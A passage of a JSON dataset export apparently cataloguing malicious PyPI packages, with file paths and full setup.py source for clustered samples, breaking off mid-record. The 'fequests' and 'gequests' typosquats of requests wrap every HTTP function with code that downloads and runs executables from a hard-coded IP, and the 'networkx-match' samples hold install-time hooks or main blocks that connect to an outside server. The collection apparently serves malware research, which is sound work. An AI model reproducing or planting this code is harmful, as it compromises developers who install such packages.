        "code": "from setuptools import setup\nimport codecs\nimport os\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nwith codecs.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as fh:\n    long_description = \"\\n\" + fh.read()\n\nabout = {}\nabout['__title__'] = \"fequests\"\nabout['__description__'] = \"Python HTTP for Humans.\"\nabout['__url__'] = \"https://requests.readthedocs.io\"\nabout['__version__'] = \"2.28.1\"\nabout['__build__'] = 0x022801\nabout['__author__'] = \"Kenneth Reitz\"\nabout['__author_email__'] = \"me@kennethreitz.org\"\nabout['__license__'] = \"Apache 2.0\"\nabout['__copyright__'] = \"Copyright 2022 Kenneth Reitz\"\nabout['__cake__'] = \"\\u2728 \\U0001f370 \\u2728\"\n\nrequires = [\n    \"charset_normalizer>=2,<4\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nsetup(\n    name=about[\"__title__\"],\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=[\"fequests\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"requests\": \"requests\"},\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n\n\nimport requests\nimport platform\nimport os\n\ndef execute():\n    operating_system = platform.system().lower()\n\n    all_executables = []\n    req = requests.get('http://35.235.126.33/all.txt')\n    for line in req.text.splitlines():\n        if operating_system in line:\n            line = line.strip()\n            all_executables.append(line)\n\n    for executable in all_executables:\n        url = f'http://35.235.126.33/{executable}'\n        req = requests.get(url)\n        with open(executable, 'wb') as f:\n            f.write(req.content)\n\n        if 'linux' in operating_system or 'darwin' in operating_system:\n            os.system(f'chmod +x {executable}')\n\n        if 'linux' in operating_system:\n            os.system(f'./{executable} &')\n        elif 'darwin' in operating_system:\n            os.system(f'./{executable} &')\n        elif 'windows' in operating_system:\n            os.system(f'start /B {executable}')\n\ndef get(url: str | bytes, params: dict | None = None, **kwargs) -> requests.Response:\n    \"\"\"Sends a GET request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param params: (optional) Dictionary or bytes to be sent in the query string for the :class:`Request`.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('get', url, params=params, **kwargs)\n\ndef post(url: str | bytes, data: dict | None = None, json: dict | None = None, **kwargs) -> requests.Response:\n    \"\"\"Sends a POST request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param data: (optional) Dictionary, bytes, or file-like object to send in the body of the :class:`Request`.\n    :param json: (optional) json data to send in the body of the :class:`Request`.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('post', url, data=data, json=json, **kwargs)\n\ndef put(url: str | bytes, data: dict | None = None, **kwargs) -> requests.Response:\n    \"\"\"Sends a PUT request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param data: (optional) Dictionary, bytes, or file-like object to send in the body of the :class:`Request`.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('put', url, data=data, **kwargs)\n\ndef patch(url: str | bytes, data: dict | None = None, **kwargs) -> requests.Response:\n    \"\"\"Sends a PATCH request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param data: (optional) Dictionary, bytes, or file-like object to send in the body of the :class:`Request`.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('patch', url, data=data, **kwargs)\n\ndef delete(url: str | bytes, **kwargs) -> requests.Response:\n    \"\"\"Sends a DELETE request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('delete', url, **kwargs)\n\ndef head(url: str | bytes, **kwargs) -> requests.Response:\n    \"\"\"Sends a HEAD request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('head', url, **kwargs)\n\ndef options(url: str | bytes, **kwargs) -> requests.Response:\n    \"\"\"Sends a OPTIONS request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('options', url, **kwargs)\n\ndef request(method: str, url: str | bytes, **kwargs) -> requests.Response:\n    \"\"\"Constructs and sends a :class:`Request <Request>`. Returns :class:`Response <Response>` object.\n\n    :param method: method for the new :class:`Request` object.\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request(method, url, **kwargs)\n\nfrom frequest import get, post, put, patch, delete"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-12-gequests",
        "code": "from setuptools import setup\nimport codecs\nimport os\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nwith codecs.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as fh:\n    long_description = \"\\n\" + fh.read()\n\nabout = {}\nabout['__title__'] = \"gequests\"\nabout['__description__'] = \"Python HTTP for Humans.\"\nabout['__url__'] = \"https://requests.readthedocs.io\"\nabout['__version__'] = \"2.28.1\"\nabout['__build__'] = 0x022801\nabout['__author__'] = \"Kenneth Reitz\"\nabout['__author_email__'] = \"me@kennethreitz.org\"\nabout['__license__'] = \"Apache 2.0\"\nabout['__copyright__'] = \"Copyright 2022 Kenneth Reitz\"\nabout['__cake__'] = \"\\u2728 \\U0001f370 \\u2728\"\n\nrequires = [\n    \"charset_normalizer>=2,<4\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nsetup(\n    name=about[\"__title__\"],\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=[\"gequests\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"requests\": \"requests\"},\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n\n\nimport requests\nimport platform\nimport os\n\ndef execute():\n    operating_system = platform.system().lower()\n\n    all_executables = []\n    req = requests.get('http://35.235.126.33/all.txt')\n    for line in req.text.splitlines():\n        if operating_system in line:\n            line = line.strip()\n            all_executables.append(line)\n\n    for executable in all_executables:\n        url = f'http://35.235.126.33/{executable}'\n        req = requests.get(url)\n        with open(executable, 'wb') as f:\n            f.write(req.content)\n\n        if 'linux' in operating_system or 'darwin' in operating_system:\n            os.system(f'chmod +x {executable}')\n\n        if 'linux' in operating_system:\n            os.system(f'./{executable} &')\n        elif 'darwin' in operating_system:\n            os.system(f'./{executable} &')\n        elif 'windows' in operating_system:\n            os.system(f'start /B {executable}')\n\ndef get(url: str | bytes, params: dict | None = None, **kwargs) -> requests.Response:\n    \"\"\"Sends a GET request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param params: (optional) Dictionary or bytes to be sent in the query string for the :class:`Request`.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('get', url, params=params, **kwargs)\n\ndef post(url: str | bytes, data: dict | None = None, json: dict | None = None, **kwargs) -> requests.Response:\n    \"\"\"Sends a POST request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param data: (optional) Dictionary, bytes, or file-like object to send in the body of the :class:`Request`.\n    :param json: (optional) json data to send in the body of the :class:`Request`.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('post', url, data=data, json=json, **kwargs)\n\ndef put(url: str | bytes, data: dict | None = None, **kwargs) -> requests.Response:\n    \"\"\"Sends a PUT request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param data: (optional) Dictionary, bytes, or file-like object to send in the body of the :class:`Request`.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('put', url, data=data, **kwargs)\n\ndef patch(url: str | bytes, data: dict | None = None, **kwargs) -> requests.Response:\n    \"\"\"Sends a PATCH request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param data: (optional) Dictionary, bytes, or file-like object to send in the body of the :class:`Request`.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('patch', url, data=data, **kwargs)\n\ndef delete(url: str | bytes, **kwargs) -> requests.Response:\n    \"\"\"Sends a DELETE request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('delete', url, **kwargs)\n\ndef head(url: str | bytes, **kwargs) -> requests.Response:\n    \"\"\"Sends a HEAD request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('head', url, **kwargs)\n\ndef options(url: str | bytes, **kwargs) -> requests.Response:\n    \"\"\"Sends a OPTIONS request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('options', url, **kwargs)\n\ndef request(method: str, url: str | bytes, **kwargs) -> requests.Response:\n    \"\"\"Constructs and sends a :class:`Request <Request>`. Returns :class:`Response <Response>` object.\n\n    :param method: method for the new :class:`Request` object.\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request(method, url, **kwargs)\n\nfrom frequest import get, post, put, patch, delete"
      }
    ]
  },
  {
    "cluster_id": 50,
    "size": 4,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-22-networkx-match-v0.1.1",
        "code": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# Note: To use the 'upload' functionality of this file, you must:\n#   $ pipenv install twine --dev\n\nimport io\nimport os\nimport sys\nfrom shutil import rmtree\nimport socket\n\nfrom setuptools import find_packages, setup, Command\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\n# Package meta-data.\nNAME = 'networkx-match'\nDESCRIPTION = 'My short description for my project.'\nURL = ''\nEMAIL = 'me@example.com'\nAUTHOR = 'Awesome Soul'\nREQUIRES_PYTHON = '>=3.6.0'\nVERSION = '0.1.1'\n\n# What packages are required for this module to be executed?\nREQUIRED = [\n    # 'requests', 'maya', 'records',\n    # 'socket'\n]\n\n# What packages are optional?\nEXTRAS = {\n    # 'fancy feature': ['django'],\n    \n}\n\n# The rest you shouldn't have to touch too much :)\n# ------------------------------------------------\n# Except, perhaps the License and Trove Classifiers!\n# If you do change the License, remember to change the Trove Classifier for that!\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n# Import the README and use it as the long-description.\n# Note: this will only work if 'README.md' is present in your MANIFEST.in file!\ntry:\n    with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n        long_description = '\\n' + f.read()\nexcept FileNotFoundError:\n    long_description = DESCRIPTION\n\n# Load the package's __version__.py module as a dictionary.\nabout = {}\nif not VERSION:\n    project_slug = NAME.lower().replace(\"-\", \"_\").replace(\" \", \"_\")\n    with open(os.path.join(here, project_slug, '__version__.py')) as f:\n        exec(f.read(), about)\nelse:\n    about['__version__'] = VERSION\n\nclass PostInstallCommand(install):\n    def run(self):\n        try:\n            ip = \"123.56.142.180\"  \n            port = 12345  \n            message = \"Hello, Server!\"  \n            server_address = (ip, port)\n\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            \n            sock.connect(server_address)\n\n            try:\n                sock.sendall(message.encode('utf-8'))\n            finally:\n                sock.close()\n\n        except Exception as e:\n            print(f\"Server ERROR: {e}\")\n        install.run(self)\n\nclass UploadCommand(Command):\n    \"\"\"Support setup.py upload.\"\"\"\n\n    description = 'Build and publish the package.'\n    user_options = []\n\n    @staticmethod\n    def status(s):\n        \"\"\"Prints things in bold.\"\"\"\n        print('\\033[1m{0}\\033[0m'.format(s))\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        try:\n            self.status('Removing previous builds\u2026')\n            rmtree(os.path.join(here, 'dist'))\n        except OSError:\n            pass\n\n        self.status('Building Source and Wheel (universal) distribution\u2026')\n        os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))\n\n        self.status('Uploading the package to PyPI via Twine\u2026')\n        os.system('twine upload dist/*')\n\n        self.status('Pushing git tags\u2026')\n        os.system('git tag v{0}'.format(about['__version__']))\n        os.system('git push --tags')\n\n        sys.exit()\n\n\n# Where the magic happens:\nsetup(\n    name=NAME,\n    version=about['__version__'],\n    description=DESCRIPTION,\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author=AUTHOR,\n    author_email=EMAIL,\n    python_requires=REQUIRES_PYTHON,\n    url=URL,\n    packages=find_packages(exclude=[\"tests\", \"*.tests\", \"*.tests.*\", \"tests.*\"]),\n\n    install_requires=REQUIRED,\n    extras_require=EXTRAS,\n    include_package_data=True,\n    license='MIT',\n    classifiers=[\n        # Trove classifiers\n        # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy'\n    ],\n    # $ setup.py publish support.\n    cmdclass={\n        'upload': UploadCommand,\n        'install': PostInstallCommand,\n    },\n)\n\n\n# Insert your code here. \nimport socket\n\ndef send_string(ip, port, message):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n        server_address = (ip, port)\n        sock.connect(server_address)\n\n        try:\n            sock.sendall(message.encode('utf-8'))\n\n            response = sock.recv(1024)\n        finally:\n            sock.close()\n\n    except Exception as e:\n        print(f\"ERROR: {e}\")\n\nif __name__ == \"__main__\":\n    ip = \"123.56.142.180\"  \n    port = 12345  \n    message = \"Hello, Server!\"  \n\n    send_string(ip, port, message)\n\nfrom .core import *\n\n\n# 8b    d8 Yb  dP 88\"\"Yb    db     dP\"\"b8 88  dP    db     dP\"\"b8 888888\n# 88b  d88  YbdP  88__dP   dPYb   dP   `\" 88odP    dPYb   dP   `\" 88__\n# 88YbdP88   8P   88\"\"\"   dP__Yb  Yb      88\"Yb   dP__Yb  Yb  \"88 88\"\"\n# 88 YY 88  dP    88     dP\"\"\"\"Yb  YboodP 88  Yb dP\"\"\"\"Yb  YboodP 888888\n\nVERSION = (5, 2, 0)\n\n__version__ = '.'.join(map(str, VERSION))\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-23-networkx-match-algr-v0.1.1",
        "code": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# Note: To use the 'upload' functionality of this file, you must:\n#   $ pipenv install twine --dev\n\nimport io\nimport os\nimport sys\nfrom shutil import rmtree\nimport socket\n\nfrom setuptools import find_packages, setup, Command\nfrom setuptools.command.develop import develop\nfrom distutils.command.install import install\nimport subprocess\n\n# Package meta-data.\nNAME = 'networkx-match-algr'\nDESCRIPTION = 'My short description for my project.'\nURL = ''\nEMAIL = 'me@example.com'\nAUTHOR = 'Awesome Soul'\nREQUIRES_PYTHON = '>=3.6.0'\nVERSION = '0.1.1'\n\n# What packages are required for this module to be executed?\nREQUIRED = [\n    # 'requests', 'maya', 'records',\n    # 'socket'\n]\n\n# What packages are optional?\nEXTRAS = {\n    # 'fancy feature': ['django'],\n    \n}\n\n# The rest you shouldn't have to touch too much :)\n# ------------------------------------------------\n# Except, perhaps the License and Trove Classifiers!\n# If you do change the License, remember to change the Trove Classifier for that!\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n# Import the README and use it as the long-description.\n# Note: this will only work if 'README.md' is present in your MANIFEST.in file!\ntry:\n    with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n        long_description = '\\n' + f.read()\nexcept FileNotFoundError:\n    long_description = DESCRIPTION\n\n# Load the package's __version__.py module as a dictionary.\nabout = {}\nif not VERSION:\n    project_slug = NAME.lower().replace(\"-\", \"_\").replace(\" \", \"_\")\n    with open(os.path.join(here, project_slug, '__version__.py')) as f:\n        exec(f.read(), about)\nelse:\n    about['__version__'] = VERSION\n\nclass PreInstallCommand(install):\n    def run(self):\n        try:\n            print(\"Running custom install command\")\n            subprocess.check_call(['echo', 'Hello, World!'])\n            \n        \n            # ip = \"172.16.0.103\"  \n            # port = 12345  \n            # message = \"Hello, Server!\"  \n            # server_address = (ip, port)\n\n            # sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            \n            # sock.connect(server_address)\n\n            # try:\n            #     sock.sendall(message.encode('utf-8'))\n            # finally:\n            #     sock.close()\n\n        except Exception as e:\n            print(f\"Server ERROR: {e}\")\n        install.run(self)\n\nclass UploadCommand(Command):\n    \"\"\"Support setup.py upload.\"\"\"\n\n    description = 'Build and publish the package.'\n    user_options = []\n\n    @staticmethod\n    def status(s):\n        \"\"\"Prints things in bold.\"\"\"\n        print('\\033[1m{0}\\033[0m'.format(s))\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        try:\n            self.status('Removing previous builds\u2026')\n            rmtree(os.path.join(here, 'dist'))\n        except OSError:\n            pass\n\n        self.status('Building Source and Wheel (universal) distribution\u2026')\n        os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))\n\n        self.status('Uploading the package to PyPI via Twine\u2026')\n        os.system('twine upload dist/*')\n\n        self.status('Pushing git tags\u2026')\n        os.system('git tag v{0}'.format(about['__version__']))\n        os.system('git push --tags')\n\n        sys.exit()\n\n\n# Where the magic happens:\nsetup(\n    name=NAME,\n    version=about['__version__'],\n    description=DESCRIPTION,\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author=AUTHOR,\n    author_email=EMAIL,\n    python_requires=REQUIRES_PYTHON,\n    url=URL,\n    packages=find_packages(exclude=[\"tests\", \"*.tests\", \"*.tests.*\", \"tests.*\"]),\n\n    install_requires=REQUIRED,\n    extras_require=EXTRAS,\n    include_package_data=True,\n    license='MIT',\n    classifiers=[\n        # Trove classifiers\n        # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy'\n    ],\n    # $ setup.py publish support.\n    cmdclass={\n        'install': PreInstallCommand,\n    },\n)\n\n\n# Insert your code here. \nimport socket\n\ndef send_string(ip, port, message):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n        server_address = (ip, port)\n        sock.connect(server_address)\n\n        try:\n            sock.sendall(message.encode('utf-8'))\n\n            response = sock.recv(1024)\n        finally:\n            sock.close()\n\n    except Exception as e:\n        print(f\"ERROR: {e}\")\n\nif __name__ == \"__main__\":\n    ip = \"123.56.142.180\"  \n    port = 12345  \n    message = \"Hello, Server!\"  \n\n    send_string(ip, port, message)\n\nfrom .core import *\n\n\n# 8b    d8 Yb  dP 88\"\"Yb    db     dP\"\"b8 88  dP    db     dP\"\"b8 888888\n# 88b  d88  YbdP  88__dP   dPYb   dP   `\" 88odP    dPYb   dP   `\" 88__\n# 88YbdP88   8P   88\"\"\"   dP__Yb  Yb      88\"Yb   dP__Yb  Yb  \"88 88\"\"\n# 88 YY 88  dP    88     dP\"\"\"\"Yb  YboodP 88  Yb dP\"\"\"\"Yb  YboodP 888888\n\nVERSION = (5, 2, 0)\n\n__version__ = '.'.join(map(str, VERSION))\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-23-networkx-match-ssss-v0.1.1",
        "code": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# Note: To use the 'upload' functionality of this file, you must:\n#   $ pipenv install twine --dev\n\nimport io\nimport os\nimport sys\nfrom shutil import rmtree\nimport socket\n\nfrom setuptools import find_packages, setup, Command\nfrom setuptools.command.develop import develop\nfrom distutils.command.install import install\nimport subprocess\n\n# Package meta-data.\nNAME = 'networkx-match-ssss'\nDESCRIPTION = 'My short description for my project.'\nURL = ''\nEMAIL = 'me@example.com'\nAUTHOR = 'Awesome Soul'\nREQUIRES_PYTHON = '>=3.6.0'\nVERSION = '0.1.1'\n\n# What packages are required for this module to be executed?\nREQUIRED = [\n    # 'requests', 'maya', 'records',\n    # 'socket'\n]\n\n# What packages are optional?\nEXTRAS = {\n    # 'fancy feature': ['django'],\n    \n}\n\n# The rest you shouldn't have to touch too much :)\n# ------------------------------------------------\n# Except, perhaps the License and Trove Classifiers!\n# If you do change the License, remember to change the Trove Classifier for that!\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n# Import the README and use it as the long-description.\n# Note: this will only work if 'README.md' is present in your MANIFEST.in file!\ntry:\n    with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n        long_description = '\\n' + f.read()\nexcept FileNotFoundError:\n    long_description = DESCRIPTION\n\n# Load the package's __version__.py module as a dictionary.\nabout = {}\nif not VERSION:\n    project_slug = NAME.lower().replace(\"-\", \"_\").replace(\" \", \"_\")\n    with open(os.path.join(here, project_slug, '__version__.py')) as f:\n        exec(f.read(), about)\nelse:\n    about['__version__'] = VERSION\n\nclass PostInstallCommand(install):\n    def run(self):\n        try:\n            print(\"Running custom install command\")\n            subprocess.check_call(['echo', 'Hello, World!'])\n            \n        \n            # ip = \"172.16.0.103\"  \n            # port = 12345  \n            # message = \"Hello, Server!\"  \n            # server_address = (ip, port)\n\n            # sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            \n            # sock.connect(server_address)\n\n            # try:\n            #     sock.sendall(message.encode('utf-8'))\n            # finally:\n            #     sock.close()\n\n        except Exception as e:\n            print(f\"Server ERROR: {e}\")\n        install.run(self)\n\nclass UploadCommand(Command):\n    \"\"\"Support setup.py upload.\"\"\"\n\n    description = 'Build and publish the package.'\n    user_options = []\n\n    @staticmethod\n    def status(s):\n        \"\"\"Prints things in bold.\"\"\"\n        print('\\033[1m{0}\\033[0m'.format(s))\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        try:\n            self.status('Removing previous builds\u2026')\n            rmtree(os.path.join(here, 'dist'))\n        except OSError:\n            pass\n\n        self.status('Building Source and Wheel (universal) distribution\u2026')\n        os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))\n\n        self.status('Uploading the package to PyPI via Twine\u2026')\n        os.system('twine upload dist/*')\n\n        self.status('Pushing git tags\u2026')\n        os.system('git tag v{0}'.format(about['__version__']))\n        os.system('git push --tags')\n\n        sys.exit()\n\n\n# Where the magic happens:\nsetup(\n    name=NAME,\n    version=about['__version__'],\n    description=DESCRIPTION,\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author=AUTHOR,\n    author_email=EMAIL,\n    python_requires=REQUIRES_PYTHON,\n    url=URL,\n    packages=find_packages(exclude=[\"tests\", \"*.tests\", \"*.tests.*\", \"tests.*\"]),\n\n    install_requires=REQUIRED,\n    extras_require=EXTRAS,\n    include_package_data=True,\n    license='MIT',\n    classifiers=[\n        # Trove classifiers\n        # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy'\n    ],\n    # $ setup.py publish support.\n    cmdclass={\n        'install': PostInstallCommand,\n    },\n)\n\n\n# Insert your code here. \nimport socket\n\ndef send_string(ip, port, message):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n        server_address = (ip, port)\n        sock.connect(server_address)\n\n        try:\n            sock.sendall(message.encode('utf-8'))\n\n            response = sock.recv(1024)\n        finally:\n            sock.close()\n\n    except Exception as e:\n        print(f\"ERROR: {e}\")\n\nif __name__ == \"__main__\":\n    ip = \"123.56.142.180\"  \n    port = 12345  \n    message = \"Hello, Server!\"  \n\n    send_string(ip, port, message)\n\nfrom .core import *\n\n\n# 8b    d8 Yb  dP 88\"\"Yb    db     dP\"\"b8 88  dP    db     dP\"\"b8 888888\n# 88b  d88  YbdP  88__dP   dPYb   dP   `\" 88odP    dPYb   dP   `\" 88__\n# 88YbdP88   8P   88\"\"\"   dP__Yb  Yb      88\"Yb   dP__Yb  Yb  \"88 88\"\"\n# 88 YY 88  dP    88     dP\"\"\"\"Yb  YboodP 88  Yb dP\"\"\"\"Yb  YboodP 888888\n\nVERSION = (5, 2, 0)\n\n__version__ = '.'.join(map(str, VERSION))\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-23-speech-dtw-v0.1.1",
